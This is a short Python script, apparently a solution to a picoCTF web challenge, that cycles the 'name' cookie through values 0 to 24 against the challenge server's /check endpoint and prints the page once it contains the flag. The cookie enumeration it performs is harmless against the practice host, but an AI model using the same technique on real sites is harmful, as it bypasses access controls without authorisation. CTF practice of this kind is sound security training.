#!bin/python3

import requests 

for i in range(25):
	cookie = 'name={}'.format(i)
	headers = {'Cookie':cookie}

	r = requests.get('http://mercury.picoctf.net:27177/check',headers=headers)
	if(r.status_code == 200) and ('picoCTF' in r.text):
		print("You fond th flag" , r.text)
